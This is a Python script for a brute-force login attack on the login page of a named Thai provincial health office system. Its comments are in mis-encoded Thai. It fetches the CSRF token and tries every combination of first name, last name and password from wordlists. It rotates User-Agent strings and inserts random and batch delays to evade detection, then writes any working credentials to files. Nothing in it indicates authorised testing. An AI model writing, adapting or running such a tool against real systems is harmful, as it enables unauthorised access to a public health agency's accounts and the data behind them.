import requests
from bs4 import BeautifulSoup
import time
import random

def read_file_lines(filename):
    """‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå‡πÅ‡∏•‡∏∞‡∏Ñ‡∏∑‡∏ô‡∏Ñ‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô list"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÑ‡∏ü‡∏•‡πå {filename}")
        return []

def brute_force_login():
    # 1. ‡∏Å‡∏≥‡∏´‡∏ô‡∏î URL
    base_url = "https://smartoffice.chiangmaihealth.go.th"
    login_url = f"{base_url}/login"
    
    # ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏Å‡∏≤‡∏£‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤
    MIN_DELAY = 2.0  # ‡∏´‡∏ô‡πà‡∏ß‡∏á‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡πà‡∏≥ 2 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
    MAX_DELAY = 5.0  # ‡∏´‡∏ô‡πà‡∏ß‡∏á‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
    BATCH_SIZE = 10  # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö 10 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÅ‡∏•‡πâ‡∏ß‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏ô‡∏≤‡∏ô
    BATCH_DELAY = 10.0  # ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å 10 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö 10 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á
    
    # 2. ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå
    fnames = read_file_lines('fname.txt')
    lnames = read_file_lines('lname.txt')
    passwords = read_file_lines('password.txt')
    
    if not fnames or not lnames or not passwords:
        print("‚ùå ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå‡πÑ‡∏î‡πâ")
        return
    
    print(f"üìä ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡πÇ‡∏´‡∏•‡∏î‡πÑ‡∏î‡πâ:")
    print(f"   - ‡∏ä‡∏∑‡πà‡∏≠: {len(fnames)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
    print(f"   - ‡∏ô‡∏≤‡∏°‡∏™‡∏Å‡∏∏‡∏•: {len(lnames)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£") 
    print(f"   - ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô: {len(passwords)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
    print(f"   - ‡∏£‡∏ß‡∏°‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö: {len(fnames) * len(lnames) * len(passwords)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
    print("-" * 50)
    
    # 3. ‡πÄ‡∏£‡∏¥‡πà‡∏° session ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡πá‡∏ö cookies
    session = requests.Session()
    
    # ‡∏à‡∏≥‡∏•‡∏≠‡∏á User-Agent ‡πÅ‡∏ö‡∏ö‡∏™‡∏∏‡πà‡∏°‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö
    user_agents = [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ]
    
    session.headers.update({
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    # 4. ‡πÇ‡∏´‡∏•‡∏î‡∏´‡∏ô‡πâ‡∏≤ login ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô‡∏≥ CSRF Token
    try:
        response = session.get(login_url)
        print(response.text)  # <<<<< ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î‡∏ô‡∏µ‡πâ
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 5. ‡∏î‡∏∂‡∏á CSRF Token ‡∏à‡∏≤‡∏Å input hidden (‡∏ï‡∏≤‡∏° test.py)
        csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
        if not csrf_input:
            print("‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö CSRF Token ‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ login")
            print("üîç ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö HTML structure...")
            
            # ‡πÅ‡∏™‡∏î‡∏á input fields ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÄ‡∏û‡∏∑‡πà‡∏≠ debug
            all_inputs = soup.find_all('input')
            print(f"‡∏û‡∏ö input fields ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô: {len(all_inputs)}")
            for i, input_field in enumerate(all_inputs, 1):
                input_name = input_field.get('name', '‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏ä‡∏∑‡πà‡∏≠')
                input_type = input_field.get('type', 'text')
                print(f"   {i}. Name: {input_name}, Type: {input_type}")
            
            return
            
        csrf_token = csrf_input['value']
        print(f"üîë CSRF Token ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ: {csrf_token}")
        print("-" * 50)
        
    except Exception as e:
        print(f"‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÇ‡∏´‡∏•‡∏î‡∏´‡∏ô‡πâ‡∏≤ login: {e}")
        return
    
    # 6. ‡∏ß‡∏ô‡∏•‡∏π‡∏õ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
    attempt_count = 0
    success_count = 0
    successful_logins = []  # ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
    
    for fname in fnames:
        for lname in lnames:
            for password in passwords:
                attempt_count += 1
                
                # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏´‡∏•‡∏≤‡∏¢‡∏Ñ‡∏£‡∏±‡πâ‡∏á
                if attempt_count % BATCH_SIZE == 0:
                    print(f"üõë ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö {BATCH_SIZE} ‡∏Ñ‡∏£‡∏±‡πâ‡∏á...")
                    print(f"‚è≥ ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤ {BATCH_DELAY} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ...")
                    time.sleep(BATCH_DELAY)
                    print("‚ñ∂Ô∏è ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ï‡πà‡∏≠...")
                    print("-" * 30)
                
                # ‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö POST
                login_data = {
                    '__RequestVerificationToken': csrf_token,
                    'fname': fname,     # ‡πÉ‡∏ä‡πâ‡∏ï‡∏±‡∏ß‡∏û‡∏¥‡∏°‡∏û‡πå‡πÄ‡∏•‡πá‡∏Å‡∏ï‡∏≤‡∏° test.py
                    'lname': lname,      # ‡πÉ‡∏ä‡πâ‡∏ï‡∏±‡∏ß‡∏û‡∏¥‡∏°‡∏û‡πå‡πÄ‡∏•‡πá‡∏Å‡∏ï‡∏≤‡∏° test.py
                    'password': password # ‡πÉ‡∏ä‡πâ‡∏ï‡∏±‡∏ß‡∏û‡∏¥‡∏°‡∏û‡πå‡πÄ‡∏•‡πá‡∏Å‡∏ï‡∏≤‡∏° test.py
                }
                
                print(f"üîç ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà {attempt_count}: {fname} {lname} / {password}")
                
                try:
                    # ‡∏™‡πà‡∏á POST ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏ü‡∏≠‡∏£‡πå‡∏° login
                    post_response = session.post(login_url, data=login_data)
                    
                    # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
                    if post_response.text.strip().lower() == "true":
                        print(f"‚úÖ Login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à! - {fname} {lname} / {password}")
                        success_count += 1
                        successful_logins.append({
                            'fname': fname,
                            'lname': lname,
                            'password': password,
                            'attempt': attempt_count
                        })
                    else:
                        print(f"‚ùå Login ‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß")
                        
                except Exception as e:
                    print(f"‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•: {e}")
                
                # ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡πÄ‡∏•‡πá‡∏Å‡∏ô‡πâ‡∏≠‡∏¢‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ server ‡∏£‡∏±‡∏ö‡∏†‡∏≤‡∏£‡∏∞‡∏°‡∏≤‡∏Å‡πÄ‡∏Å‡∏¥‡∏ô‡πÑ‡∏õ
                # ‡πÉ‡∏ä‡πâ‡πÄ‡∏ß‡∏•‡∏≤‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÅ‡∏ö‡∏ö‡∏™‡∏∏‡πà‡∏°‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö
                delay = random.uniform(MIN_DELAY, MAX_DELAY)  # ‡∏´‡∏ô‡πà‡∏ß‡∏á 2-5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
                print(f"‚è≥ ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤ {delay:.1f} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ...")
                time.sleep(delay)
                print("-" * 30)
    
    # 7. ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
    print("=" * 50)
    print("üìà ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö:")
    print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏ó‡∏î‡∏™‡∏≠‡∏ö: {attempt_count}")
    print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à: {success_count}")
    print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß: {attempt_count - success_count}")
    print("=" * 50)
    
    # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå
    try:
        with open('brute_force_results.txt', 'w', encoding='utf-8') as f:
            f.write(f"‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö Brute Force Login\n")
            f.write(f"‡∏ß‡∏±‡∏ô‡∏ó‡∏µ‡πà: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"=" * 50 + "\n")
            f.write(f"‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏ó‡∏î‡∏™‡∏≠‡∏ö: {attempt_count}\n")
            f.write(f"‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à: {success_count}\n")
            f.write(f"‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß: {attempt_count - success_count}\n")
            f.write(f"=" * 50 + "\n")
            
            if successful_logins:
                f.write(f"\nüîê ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà Login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à:\n")
                f.write(f"-" * 30 + "\n")
                for i, login in enumerate(successful_logins, 1):
                    f.write(f"{i}. {login['fname']} {login['lname']} / {login['password']} (‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà {login['attempt']})\n")
            else:
                f.write(f"\n‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà Login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à\n")
                
        print("üíæ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå brute_force_results.txt ‡πÅ‡∏•‡πâ‡∏ß")
        
        # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå‡πÅ‡∏¢‡∏Å
        if successful_logins:
            with open('successful_logins.txt', 'w', encoding='utf-8') as f:
                f.write(f"‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà Login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à\n")
                f.write(f"‡∏ß‡∏±‡∏ô‡∏ó‡∏µ‡πà: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"=" * 30 + "\n")
                for login in successful_logins:
                    f.write(f"{login['fname']} {login['lname']} / {login['password']}\n")
            print("üíæ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå successful_logins.txt ‡πÅ‡∏•‡πâ‡∏ß")
            
    except Exception as e:
        print(f"‚ùå ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡πÑ‡∏î‡πâ: {e}")

if __name__ == "__main__":
    print("üöÄ ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö Brute Force Login")
    print("=" * 50)
    brute_force_login()